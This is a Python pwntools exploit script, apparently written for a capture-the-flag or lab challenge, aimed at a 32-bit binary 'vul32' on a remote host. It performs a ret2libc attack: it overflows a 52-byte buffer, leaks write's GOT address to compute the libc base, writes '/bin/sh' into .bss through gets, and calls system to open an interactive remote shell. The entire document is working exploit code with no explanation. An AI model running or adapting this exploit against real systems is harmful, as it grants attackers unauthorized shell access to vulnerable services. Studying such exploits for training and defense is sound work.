#! /usr/bin/python
from pwn import *

WRITE_LIBC_ADDR = 0x000d43c0
GETS_LIBC_ADDR = 0x0005e890
SYSTEM_LIBC_ADDR = 0x0003a940
STR_ADDR = 0x804a088            # completed in .bss
VUL_RET_ADDR = 0x80486bf        # ret addr of dovuln

#sh = process('./vul32')
sh = remote('202.112.51.154', 20001)
elf = ELF('./vul32')

dovuln_addr = elf.symbols['dovuln']
write_addr = elf.plt['write']
print elf.got
write_got = elf.got['write']

print "dovuln 0x%x" % dovuln_addr
print "write 0x%x" % write_addr
print "write_got 0x%x" % write_got
print "\n"

payload = flat([    \
    'G' * 52,       \
    write_addr,     \
    dovuln_addr,    \
    1,              \
    write_got,      \
    4               \
])

# plz ...
rc = sh.recv()
print 'rcv 1st:', rc
sh.sendline(payload)

# GGG...
rc = sh.recv()
print 'rcv 2nd,', rc
# \n addr
rc = sh.recv()
print 'rcv 3rd,', rc
write_addr = u32(rc[1:5])   # discard '\n'
print "write_addr 0x%x" % write_addr

libcbase = write_addr - WRITE_LIBC_ADDR
system_addr = libcbase + SYSTEM_LIBC_ADDR
gets_addr = libcbase + GETS_LIBC_ADDR
print "system addr 0x%x\n" % system_addr

print "gets /bin/sh"
payload = flat([    \
    'G' * 52,       \
    gets_addr,      \
    dovuln_addr,    \
    STR_ADDR        \
])

sh.sendline(payload)
# GGG...
rc = sh.recv()
print "rcv 4th,", rc

# write /bin/sh to .bss
sh.sendline('/bin/sh')

print "hacking"
payload = flat([    \
    'G' * 52,       \
    system_addr,    \
    VUL_RET_ADDR,   \
    STR_ADDR        \
])
sh.sendline(payload)

# got shell
print "now pwn"
sh.interactive()
